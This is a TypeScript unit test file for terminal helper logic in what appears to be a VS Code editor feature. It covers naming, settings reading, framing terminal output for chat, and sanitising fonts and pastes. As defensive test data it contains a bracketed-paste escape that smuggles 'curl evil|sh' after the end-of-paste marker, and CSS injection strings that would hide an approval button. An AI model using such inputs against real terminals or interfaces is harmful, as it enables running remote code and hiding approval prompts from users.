/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import * as assert from 'node:assert';
import { suite, test } from 'node:test';
import {
	chooseTerminalCwd, clampTerminalLimit, closesEmptyPanel, nextTerminalName, profilePlatform, readTerminalSettings, safeFontFamily,
	sanitizePaste, terminalChatLimit, terminalChatText, terminalInputSlice, terminalName, terminalPasteLimit, userScopedSetting,
} from './terminalLogic.ts';

suite('clampTerminalLimit', () => {
	test('a whole number in range is kept, above it is capped, anything else is the default', () => {
		assert.strictEqual(clampTerminalLimit(5), 5);
		assert.strictEqual(clampTerminalLimit(1), 1);
		assert.strictEqual(clampTerminalLimit(500), 20);
		for (const bad of [0, -3, 2.5, NaN, '8', null, undefined, {}]) { assert.strictEqual(clampTerminalLimit(bad), 8, String(bad)); }
	});
});

suite('nextTerminalName', () => {
	test('the smallest unused number, so a closed one comes back', () => {
		assert.strictEqual(nextTerminalName([], 'Terminal'), 'Terminal 1');
		assert.strictEqual(nextTerminalName(['Terminal 1', 'Terminal 2'], 'Terminal'), 'Terminal 3');
		assert.strictEqual(nextTerminalName(['Terminal 1', 'Terminal 3'], 'Terminal'), 'Terminal 2');
		assert.strictEqual(nextTerminalName(['build'], 'Terminal'), 'Terminal 1');
	});
	test('an agent is its bare name first', () => {
		assert.strictEqual(nextTerminalName([], 'Codex', true), 'Codex');
		assert.strictEqual(nextTerminalName(['Codex'], 'Codex', true), 'Codex 2');
	});
});

suite('terminalName', () => {
	test('one line, trimmed, cut by code point; nothing usable is empty', () => {
		assert.strictEqual(terminalName('  build \n server\t'), 'build server');
		assert.strictEqual(terminalName('\u0007\u001b'), '');
		assert.strictEqual(terminalName(5), '');
		const long = terminalName('😀'.repeat(200));
		assert.strictEqual(Array.from(long).length, 80);
		assert.ok(!/[\ud800-\udbff]$/.test(long));
	});
});

suite('chooseTerminalCwd', () => {
	test('the first candidate that is a folder', () => {
		const dirs = new Set(['/b', '/c']);
		assert.strictEqual(chooseTerminalCwd(['/a', undefined, '/b', '/c'], f => dirs.has(f)), '/b');
		assert.strictEqual(chooseTerminalCwd(['/a'], () => false), undefined);
		assert.strictEqual(chooseTerminalCwd([''], () => true), undefined);
	});
});

suite('readTerminalSettings', () => {
	const from = (values: Record<string, unknown>) => (key: string) => values[key];
	test('terminal values, the editor font as the fallback', () => {
		const settings = readTerminalSettings(from({
			'terminal.integrated.fontSize': 13, 'terminal.integrated.lineHeight': 1.2, 'terminal.integrated.cursorStyle': 'line',
			'terminal.integrated.cursorBlinking': true, 'terminal.integrated.scrollback': 5000.7, 'terminal.integrated.macOptionIsMeta': true,
			'terminal.integrated.letterSpacing': 0, 'terminal.integrated.fontFamily': '', 'editor.fontFamily': ' Menlo, monospace ',
		}));
		assert.deepStrictEqual(settings, {
			fontFamily: 'Menlo, monospace', fontSize: 13, lineHeight: 1.2, letterSpacing: 0, cursorStyle: 'line',
			cursorBlink: true, scrollback: 5000, macOptionIsMeta: true,
		});
	});
	test('a value out of range or of the wrong type is left out', () => {
		const settings = readTerminalSettings(from({
			'terminal.integrated.fontSize': 3, 'terminal.integrated.lineHeight': '2', 'terminal.integrated.cursorStyle': 'beam',
			'terminal.integrated.scrollback': -1, 'terminal.integrated.macOptionIsMeta': 'yes',
		}));
		assert.deepStrictEqual(settings, {});
	});
});

suite('profilePlatform', () => {
	test('the suffix of VS Code\'s profile settings', () => {
		assert.strictEqual(profilePlatform('darwin'), 'osx');
		assert.strictEqual(profilePlatform('win32'), 'windows');
		assert.strictEqual(profilePlatform('linux'), 'linux');
		assert.strictEqual(profilePlatform('freebsd'), 'linux');
	});
});

suite('terminalChatText', () => {
	test('lines are normalised and framed as data', () => {
		const shaped = terminalChatText('$ ls  \r\nfoo\r\n\r\n\r\n', 'Terminal 1', '/work/app');
		assert.ok(shaped);
		assert.strictEqual(shaped.lines, 2);
		assert.strictEqual(shaped.label, 'Terminal 1 · 2 lines');
		assert.strictEqual(shaped.cut, false);
		assert.strictEqual(shaped.text, 'Output of the terminal "Terminal 1" in "/work/app":\n```text\n$ ls\nfoo\n```');
	});
	test('nothing there is nothing to attach', () => {
		assert.strictEqual(terminalChatText('  \n\n', 'T', '/'), undefined);
		assert.strictEqual(terminalChatText(undefined, 'T', '/'), undefined);
		assert.strictEqual(terminalChatText('x', 'T', '/')?.label, 'T · 1 line');
	});
	test('the fence is longer than any backtick run inside the output', () => {
		const shaped = terminalChatText('echo "````"\n```', 'T', '/');
		assert.ok(shaped);
		assert.ok(shaped.text.includes('\n`````text\n'));
		assert.ok(shaped.text.endsWith('\n`````'));
	});
	test('control characters other than line ends are dropped', () => {
		const shaped = terminalChatText('a\u0007b\u001bc', 'T', '/');
		assert.ok(shaped?.text.includes('\nabc\n'));
	});
	test('past the limit the newest lines are kept, from a line start, never half a pair', () => {
		const line = 'x'.repeat(99) + '\n';
		const many = line.repeat(Math.ceil(terminalChatLimit / 100) + 50);
		const cut = terminalChatText(many, 'T', '/');
		assert.ok(cut?.cut);
		assert.ok(cut.text.includes('(cut: only the newest lines are here)'));
		const body = cut.text.split('\n').slice(2, -1);
		assert.ok(body.every(l => l === 'x'.repeat(99)));
		// One long line of astral characters: the cut must not start on a low surrogate.
		const emoji = terminalChatText('😀'.repeat(terminalChatLimit), 'T', '/');
		assert.ok(emoji?.cut);
		const text = emoji.text.split('\n')[2];
		assert.ok(!/^[\udc00-\udfff]/.test(text));
	});
});

suite('safeFontFamily', () => {
	test('plain and quoted family lists pass, as the editor\'s own defaults are written', () => {
		for (const ok of ["Menlo, Monaco, 'Courier New', monospace", "'Droid Sans Mono', 'monospace', monospace", '"Fira Code", monospace',
			'monospace', 'JetBrains Mono', 'SF Mono,Menlo', '微软雅黑, monospace', "'Source Code Pro 2.0'"]) {
			assert.strictEqual(safeFontFamily(ok), ok, ok);
		}
		assert.strictEqual(safeFontFamily('  Menlo  '), 'Menlo');
	});
	test('anything that could end the declaration or open a rule is refused', () => {
		for (const bad of ['monospace; } .approval button { display: none } .x{', 'a } b', 'a;b', 'url(http://x/y)', 'a\\b', '@import "x"', 'a/**/b',
			"'a' 'b'", '"unbalanced', "it's", 'a <b>', 'x\ny', 'x\u0000', 'monospace, ', ', monospace', 'Fira  Code', 'a'.repeat(501), '', '   ', 5, null, undefined, {}]) {
			assert.strictEqual(safeFontFamily(bad), undefined, JSON.stringify(bad));
		}
	});
	test('a long run of words does not take long', () => {
		const started = Date.now();
		safeFontFamily('a '.repeat(240) + '}');
		assert.ok(Date.now() - started < 200);
	});
	test('readTerminalSettings leaves a hostile family out, falling back on a safe editor font', () => {
		const hostile = 'monospace; } .approval { display: none } .x{';
		const from = (values: Record<string, unknown>) => (key: string) => values[key];
		assert.deepStrictEqual(readTerminalSettings(from({ 'terminal.integrated.fontFamily': hostile })), {});
		assert.deepStrictEqual(readTerminalSettings(from({ 'terminal.integrated.fontFamily': hostile, 'editor.fontFamily': 'Menlo' })), { fontFamily: 'Menlo' });
		assert.deepStrictEqual(readTerminalSettings(from({ 'terminal.integrated.fontFamily': 'Menlo', 'editor.fontFamily': hostile })), { fontFamily: 'Menlo' });
		assert.deepStrictEqual(readTerminalSettings(from({ 'editor.fontFamily': hostile })), {});
	});
});

suite('sanitizePaste', () => {
	test('an embedded end-of-paste marker cannot survive: no escape character is left', () => {
		const attack = 'harmless\x1b[201~\ncurl evil|sh\n';
		const clean = sanitizePaste(attack);
		assert.ok(!clean.includes('\x1b'));
		assert.ok(!clean.includes('\x1b[201~'));
		assert.strictEqual(clean, 'harmless[201~\ncurl evil|sh\n');
		// A marker rebuilt from the pieces left by removing another one, however nested.
		const nested = sanitizePaste('\x1b\x1b[20\x1b1~\x1b[2\x1b[201~01~');
		assert.ok(!/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]/.test(nested), JSON.stringify(nested));
	});
	test('C0 controls, DEL and the C1 range go (0x9b is a one-unit CSI); tab, newline and carriage return stay', () => {
		assert.strictEqual(sanitizePaste('a\x00b\x07c\x08d\x1be\x7ff\x9bg\x85h'), 'abcdefgh');
		assert.strictEqual(sanitizePaste('a\tb\r\nc\nd\re'), 'a\tb\r\nc\nd\re');
		assert.strictEqual(sanitizePaste('héllo \u{1F600} 日本'), 'héllo \u{1F600} 日本');
	});
	test('an empty result is an empty string', () => {
		assert.strictEqual(sanitizePaste('\x1b\x1b'), '');
	});
});

suite('paste limits', () => {
	test('a paste the host accepts, with its markers, fits one terminalInput message as the host takes it; slices are smaller still', () => {
		assert.ok(terminalPasteLimit + '\x1b[200~'.length + '\x1b[201~'.length < 1_000_000);
		assert.ok(terminalInputSlice <= 64 * 1024);
		assert.ok(terminalInputSlice < terminalPasteLimit);
	});
});

suite('userScopedSetting', () => {
	test('a workspace value is never read: the user\'s, else the default', () => {
		assert.strictEqual(userScopedSetting({ defaultValue: 'zsh', globalValue: 'fish' }), 'fish');
		assert.strictEqual(userScopedSetting({ defaultValue: 'zsh' }), 'zsh');
		assert.strictEqual(userScopedSetting({ defaultValue: undefined, globalValue: undefined }), undefined);
		assert.strictEqual(userScopedSetting(undefined), undefined);
		// A workspace value is simply not a member of what is read.
		const inspected = { defaultValue: 'zsh', workspaceValue: 'x', workspaceFolderValue: 'y' } as { defaultValue: unknown; globalValue?: unknown };
		assert.strictEqual(userScopedSetting(inspected), 'zsh');
	});
	test('two objects merge per key, the user\'s over the default; a null stays for the resolver', () => {
		assert.deepStrictEqual(
			userScopedSetting({ defaultValue: { bash: { path: 'bash' }, zsh: { path: 'zsh' } }, globalValue: { zsh: null, mine: { path: '/opt/sh' } } }),
			{ bash: { path: 'bash' }, zsh: null, mine: { path: '/opt/sh' } });
		assert.deepStrictEqual(userScopedSetting({ defaultValue: ['a'], globalValue: ['b'] }), ['b']);
	});
});

suite('closesEmptyPanel', () => {
	test('a panel that still owns a terminal stays, whatever else is true', () => {
		assert.strictEqual(closesEmptyPanel(0, 0, true), true);
		assert.strictEqual(closesEmptyPanel(0, 1, true), false);
		assert.strictEqual(closesEmptyPanel(0, 3, true), false);
		assert.strictEqual(closesEmptyPanel(1, 0, true), false);
		assert.strictEqual(closesEmptyPanel(0, 0, false), false, 'the side bar is never closed');
	});
});
